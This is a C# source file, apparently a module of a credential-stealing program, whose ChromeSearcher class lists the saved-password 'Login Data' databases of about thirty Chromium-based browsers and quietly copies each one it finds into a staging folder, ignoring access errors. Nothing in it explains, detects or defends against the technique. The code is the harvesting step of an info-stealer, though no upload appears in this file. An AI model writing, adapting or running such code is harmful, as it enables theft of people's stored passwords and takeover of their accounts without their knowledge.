namespace PEngine.Engine.Browsers.Chromium
{
    using PEngine.Helpers;
    using PEngine.Main;
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Security;

    public class ChromeSearcher
    {
        public static List<string> GetLogins = new List<string>();

        private static readonly List<string> BrPaths = new List<string>
        {
           CombineEx.Combination(GlobalPath.AppData, @"Opera Software\Opera Stable\Login Data"),
           CombineEx.Combination(GlobalPath.AppData, @"Opera Software\Opera Developer\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Opera Software\Opera Neon\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.AppData, @"Avant Profiles\.default\webkit\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Yandex\YandexBrowser\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Google\Chrome\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Comodo\Dragon\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Orbitum\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Torch\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Kometa\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Amigo\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Kinza\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"BraveSoftware\Brave-Browser\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"360Browser\Browser\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"7Star\7Star\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Chromium\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Iridium\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Nichrome\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"MapleStudio\ChromePlus\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Vivaldi\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Epic Privacy Browser\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"CatalinaGroup\Citrio\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"CocCoc\Browser\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Sputnik\Sputnik\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"uCozMedia\Uran\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"CentBrowser\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Elements Browser\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Superbird\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Chedot\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Suhba\User Data\Default\Login Data"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Rafotech\Mustang\User Data\Default\Login Data")
        };

        private static void GetSecureFile(string PathLogins, string Pattern, SearchOption SO = SearchOption.TopDirectoryOnly)
        {
            try
            {
                foreach (string Mic in Directory.EnumerateFiles(PathLogins, Pattern, SO))
                {
                    if (!File.Exists(Mic))
                    {
                        continue;
                    }
                    else
                    {
                        GetLogins.Add(Mic);
                    }
                }
            }
            catch (UnauthorizedAccessException) { }
            catch (IOException) { }
            catch (SecurityException) { }
        }

        public static void CopyLoginsInSafeDir(string Folder, bool Recursive = true)
        {
            CombineEx.CreateDir(Folder);
            for (int i = 0; i < BrPaths.Count; i++)
            {
                int SafeIndex = i;
                if (File.Exists(BrPaths[SafeIndex]))
                {
                    try
                    {
                        CombineEx.FileCopy(BrPaths[SafeIndex], CombineEx.Combination(Folder, Path.GetFileName(GetApplication.GetBrowserName(BrPaths[SafeIndex]))), Recursive);
                        GetSecureFile(Folder, GetApplication.GetBrowserName(BrPaths[SafeIndex]));
                    }
                    catch (ArgumentException) { }
                }
            }
        }
    }
}